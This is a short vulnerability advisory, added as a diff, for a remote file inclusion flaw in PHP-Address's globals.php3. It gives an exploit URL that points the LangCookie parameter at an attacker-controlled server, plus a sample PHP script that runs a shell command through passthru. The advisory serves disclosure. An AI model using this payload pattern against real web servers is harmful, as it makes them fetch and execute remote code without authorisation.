@@ -1,0 +1,17 @@
+source: http://www.securityfocus.com/bid/5039/info
+
+PHP-Address is prone to an issue which may allow remote attackers to include arbitrary files located on remote servers. If the remote file is a PHP script, this may allow for execution of attacker-supplied PHP code with the privileges of the webserver. 
+
+http://SERVER/globals.php3?LangCookie=http://MYSERVER/x
+(the .php3 is already there look at line 5 in global.php3)
+
+Remote script located on MYSERVER:
+
+------------x.php3------------
+<?
+passthru("/bin/ls /");
+?>
+-------------------------------
+
+Outputs a directory listing.
+
